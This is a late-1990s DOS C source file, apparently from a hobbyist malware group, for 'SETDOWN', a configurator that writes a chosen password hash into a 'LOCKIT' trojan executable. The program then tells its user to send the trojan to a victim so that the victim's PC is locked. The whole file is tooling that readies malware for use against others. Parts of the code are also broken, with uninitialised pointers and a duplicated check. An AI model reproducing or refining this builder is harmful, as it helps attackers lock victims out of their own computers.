#include <stdio.h>
#include <io.h>
#include <alloc.h>
#include <fcntl.h>
#include <process.h>
#include <sys\stat.h>

char unsigned ReadValue(int handle, long position);
void WriteValue(int handle, long position, char unsigned value);
char unsigned CheckPassw(char *Passwd);

int main(void)
{
   const	H_op_pos = 0xF,
		L_op_pos = 0x16,
		H_op = 0xB4,
		L_op = 0xB4,

		H_val_pos = 0x10,
		L_val_pos = 0x17;

   char buffer[9];
   char *Passwd = buffer;
   char *Filename;

   int handle;
   char unsigned HashedHByte, HashedLByte;

   printf("SETDOWN.EXE v1.8 -- SeTuP uTiLiTY FoR -=x[ LOCKIT TRoJaN ]x=-\n");
   printf("CoDeD BY [Stas], (C)oPyLeFT BY ]| SysD Destructive Labs |[, 1997-1998\n\n");

   strcpy(Filename, "LOCKIT.COM");
   handle = -1;

   while ((handle = open(Filename, O_RDWR, S_IREAD | S_IWRITE)) == -1){
      printf("eRRoR oPeNiNG \"%s\" !!!!!\7\nTYPe FiLeNaMe oF -=x[ LOCKIT ]x=-: ", Filename);
      gets(Filename);
   }

   if ((ReadValue(handle, H_op_pos) != H_op) || (ReadValue(handle, L_op_pos) != L_op)){
      printf("iNVaLiD -=x[ LOCKIT ]x=- eXeCuTaBLe !!!!!\7\n");
      exit(1);
   }

   printf("PaSSWoRD To SeT oN LaMaH'Z PC: ");

   while(1){
      gets(Passwd);
      if ((strlen(Passwd) >= 1) && (strlen(Passwd) <= 8) && CheckPassw(Passwd) == 1)break;
      printf("\nPaSSWoRD \"%s\" iS iNVaLiD!\7 eNTeR oTHeR oNe: ", Passwd);
   }

   asm 	xor     ax, ax;
   asm 	xor     bx, bx;
   asm	mov	cx, 8;
   asm	mov	si, offset Passwd;
DoHash:
   asm	mov	al, byte ptr [si];
   asm	or	al, al;
   asm	jz	DoneHash;
   asm	rol	bx, 1;
   asm	rol	bx, 1;
   asm	add	bx, ax;
   asm	inc 	si;
   asm	loop	DoHash;
DoneHash:
   asm	mov	byte ptr [HashedHByte], bl;
   asm	mov	byte ptr [HashedLByte], bh;

   printf("eNCRYPTeD PaSSWoRD \"%s\" aS [%02Xh %02Xh]... WRiTiNG iT NoW!\n", Passwd, HashedHByte, HashedLByte);

   WriteValue(handle, H_val_pos, HashedHByte);
   WriteValue(handle, L_val_pos, HashedLByte);

   if ((ReadValue(handle, H_val_pos) == HashedHByte) && (ReadValue(handle, H_val_pos) == HashedHByte)){
      printf("aLL oKZ! NoW, SeND \"%s\" To YouR FaVouRiTe LaMaH!\n", Filename);
   }else{
      printf("SoMe FuCKiN' eRRoR oCCouReD WRiTiNG \"%s\"...\7\n", Filename);
   }

   close(handle);
   return 0;
}

char unsigned CheckPassw(char *Passwd)
{
   char unsigned i;

   for (i = 0; i < strlen(Passwd); i++){
      if((Passwd[i] < 32) || (Passwd[i] > 126))return 0;
   }

   return 1;
}

char unsigned ReadValue(int handle, long position)
{
   char *value = "\0";

   lseek(handle, position, SEEK_SET);
   read(handle, value, 1);

   return *(char unsigned*)value;
}

void WriteValue(int handle, long position, char unsigned value)
{
   char *byte;
   byte[0] = value;

   lseek(handle, position, SEEK_SET);
   write(handle, byte, 1);
}